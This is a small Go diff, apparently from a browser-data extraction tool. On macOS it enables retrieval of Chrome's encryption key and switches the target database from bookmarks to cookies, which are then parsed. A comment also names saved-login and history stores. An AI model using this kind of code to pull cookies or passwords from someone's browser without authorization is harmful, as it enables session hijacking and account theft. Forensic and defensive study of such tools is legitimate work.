@@ -18,16 +18,16 @@ func parse() {
 	osName := runtime.GOOS
 	switch osName {
 	case "darwin":
-		//err := utils.InitChromeKey()
-		//if err != nil {
-		//	log.Println(err)
-		//	panic("init chrome key failed")
-		//}
+		err := utils.InitChromeKey()
+		if err != nil {
+			log.Println(err)
+			panic("init chrome key failed")
+		}
 	case "windows":
 		fmt.Println("Windows")
 	}
 	//chromePath, err := utils.GetDBPath(utils.LoginData, utils.History, utils.BookMarks, utils.Cookies, utils.WebData)
-	chromePath, err := utils.GetDBPath(utils.Bookmarks)
+	chromePath, err := utils.GetDBPath(utils.Cookies)
 	if err != nil {
 		log.Error("can't find chrome.app in OS")
 	}
@@ -40,5 +40,4 @@ func parse() {
 		}
 		common.ParseDB(dst)
 	}
-
 }
